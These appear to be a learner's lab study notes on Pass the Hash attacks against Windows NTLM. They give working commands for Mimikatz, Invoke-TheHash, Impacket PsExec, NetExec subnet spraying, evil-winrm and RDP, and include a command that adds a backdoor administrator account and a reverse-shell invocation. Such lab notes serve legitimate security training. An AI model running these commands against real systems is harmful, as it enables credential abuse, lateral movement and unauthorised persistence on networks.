- A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique **==where an attacker uses a password hash instead of the plain text password for authentication.==** 
- Let's assume we obtain the password hash (`64F12CDDAA88057E06A81B54E73B949B`) for the account `julio` from the domain `inlanefreight.htb`. Let's see how we can perform Pass the Hash attacks from Windows and Linux machines.

# Introduction to Windows NTLM
---
- Microsoft's [Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) is a **set of security protocols that authenticates users' identities** while also protecting the integrity and confidentiality of their data. 
- **==NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.==**
- With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password.
- We call this a `Pass the Hash (PtH) Attack`.

# Pass the Hash with Mimikatz (Windows)
---
- Mimikatz has a module named **==`sekurlsa::pth`==** that allows us to perform a **Pass the Hash attack by starting a process using the hash** of the user's password. 
- To use this module, we will need the following:
	- `/user` - The user name we want to impersonate.
	- `/rc4` or `/NTLM` - NTLM hash of the user's password.
	- `/domain` - Domain the user to impersonate belongs to. In the case of a **local user account, we can use the computer name, localhost, or a dot (.).**
	- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

- Pass the Hash from Windows Using Mimikatz:
	- `mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit`

# Pass the Hash with PowerShell Invoke-TheHash (Windows)
---
- Another tool we can use to perform **Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash).**
- This tool is a collection of **PowerShell functions for performing Pass the Hash** attacks with WMI and SMB.
- Local administrator privileges are not required client-side, **==but the user and hash we use to authenticate need to have administrative rights==** on the target computer.
- When using `Invoke-TheHash`, we have two options: **SMB or WMI command** execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:
	- `Target` - Hostname or IP address of the target.
	- `Username` - Username to use for authentication.
	- `Domain` - Domain to use for authentication. This **parameter is unnecessary with local accounts** or when using the @domain after the username.
	- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
	- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

- Invoke-TheHash with SMB:
	- `powershell -ep bypass`
	- `Import-Module .\Invoke-TheHash.psd1`
	- `Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose`
- Instead of providing the IP address, which is `172.16.1.10`, **we can use the machine name `DC01`** (either would work).
- We can **also get a reverse shell connection in the target machine.**:
	- ```
```
Invoke-SMBExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "RevShell_com_PowerShell3_B64_Encoded"
```

# Pass the Hash with Impacket (Linux)
---
- We will perform command execution on the target machine using `PsExec`.
-  Pass the Hash with Impacket PsExec:
	- `impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`

# Pass the Hash with NetExec (Linux)
---
- We can use NetExec to try to authenticate to some or **==all hosts in a network looking for one host where we can authenticate successfully as a local admin==**

- Pass the Hash with NetExec:
	- `netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`
- If we want to perform the same actions but attempt to authenticate to each host in a subnet using the **==local administrator password hash, we could add `--local-auth` to our command.==** 
- This method is helpful if we obtain a local administrator hash by ==**dumping the** **local SAM database**== on one host and want to **check how many (if any)** other hosts we can access due to ==**local admin password re-use.**==
- If we see `Pwn3d!`, it means that the user is a local administrator on the target computer.

- NetExec - Command Execution:
	- `netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami`

# Pass the Hash with evil-winrm (Linux)
---
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) is another tool we can use to **authenticate using the Pass the Hash attack with PowerShell remoting.**
- If **==SMB is blocked or we don't have administrative rights==**, we can use this **alternative protocol** to connect to the target machine.

- Pass the Hash with evil-winrm:
	- `evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`
- **Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb


# Pass the Hash with RDP (Linux)
---
- There are a few caveats to this attack:
	- `Restricted Admin Mode`, which is disabled by default, should be **enabled on the target host; otherwise, you will be presented with the following error:**
		- ![[Pasted image 20250703055355.png]]
- **==Enable Restricted Admin Mode to allow PtH:==**
	- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

- Pass the Hash using RDP:
	- `xfreerdp3  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`

# UAC limits Pass the Hash for local accounts
---
- UAC (User Account Control) **limits local users' ability to perform remote administration operations.**
- When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0,
	- It means that the **built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks.** Setting it to 1 allows the other local admins as well.
- These settings are **ONLY for local administrative accounts**. If we get access to a **==domain account with administrative rights on a computer, we can still use Pass the Hash with that computer.==**